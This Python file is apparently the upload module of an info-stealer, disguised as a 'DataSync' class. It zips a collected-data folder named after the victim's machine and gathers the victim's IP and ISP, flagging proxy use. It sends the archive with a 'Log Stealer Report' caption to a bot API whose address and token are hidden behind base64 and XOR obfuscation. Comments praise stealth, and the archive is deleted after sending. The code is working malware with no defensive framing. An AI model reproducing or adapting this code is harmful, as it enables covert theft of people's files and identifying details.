import os
import shutil
import requests
import logging
import socket
import base64
from datetime import datetime

class DataSync:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        # Deeply obfuscated configs
        self._k = [66, 19, 153, 250, 36, 119] # Key
        self._t = "URL"
        self._c = "Token"
        self._u = "ID"
        
        base_url = self._d(self._u)
        bot_token = self._d(self._t)
        
        self.api_url = f"{base_url}{bot_token}/URL"
        self.chat_id = self._d(self._c)

    def _d(self, e):
        # 1. Base64 Decode
        try:
            b = base64.b64decode(e)
            # 2. XOR
            x = bytearray()
            for i, byte in enumerate(b):
                x.append(byte ^ self._k[i % len(self._k)])
            # 3. Reverse to get original string
            return x.decode('utf-8')[::-1]
        except:
            return ""

    def pack_data(self):
        try:
            pc_name = socket.gethostname()
            date_str = datetime.now().strftime("%d-%m-%y_%H-%M")
            zip_filename = f"LogFrom_{pc_name}_{date_str}" 
            
            base_dir = os.path.dirname(self.output_dir)
            zip_path = os.path.join(base_dir, zip_filename)
            
            shutil.make_archive(zip_path, 'zip', self.output_dir)
            return zip_path + ".zip"
        except Exception as e:
            # Silent fail or generic error
            return None

    def get_net_status(self):
        details = {
            "ISP": "Unknown",
            "IPv4": "Unknown",
            "IPv6": "Unknown", 
            "UserAgent": f"Python-Requests/{requests.__version__}",
            "FakeIP": "No"
        }
        try:
            r = requests.get("http://ip-api.com/json/?fields=status,message,query,isp,proxy,hosting", timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    details["ISP"] = data.get("isp", "Unknown")
                    details["IPv4"] = data.get("query", "Unknown")
                    
                    is_fake = data.get("proxy", False) or data.get("hosting", False)
                    details["FakeIP"] = "Yes" if is_fake else "No"
        except Exception:
            pass
            
        return details

    def start_sync(self):
        zip_file = self.pack_data()
        if not zip_file:
            return

        try:
            # Stealth: Generic message
            print(f"[*] Syncing {os.path.basename(zip_file)}...")
            
            net_info = self.get_net_status()
            
            with open(zip_file, 'rb') as f:
                files = {'document': f}
                
                # Report Caption
                caption = (
                    f"Log Stealer Report\n"
                    f"------------------\n"
                    f"PC: {socket.gethostname()}\n"
                    f"User: {os.getlogin()}\n"
                    f"ISP: {net_info['ISP']}\n"
                    f"IPv4: {net_info['IPv4']}\n"
                    f"IPv6: {net_info['IPv6']}\n"
                    f"Agent: {net_info['UserAgent']}\n"
                    f"F-IP: {net_info['FakeIP']}"
                )
                
                data = {'chat_id': self.chat_id, 'caption': caption}
                
                response = requests.post(self.api_url, files=files, data=data)
                
            if response.status_code == 200:
                print("[+] Sync successful!")
            else:
                print(f"[-] Sync failed: {response.text}")
                
        except Exception as e:
            print(f"[-] DB Connection error: {e}")
        finally:
            try:
                if os.path.exists(zip_file):
                    os.remove(zip_file)
            except:
                pass

if __name__ == "__main__":
    # Test
    logging.basicConfig(level=logging.INFO)
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    OUTPUT_DIR = os.path.join(BASE_DIR, "output")
    syncer = DataSync(OUTPUT_DIR)
    syncer.start_sync()
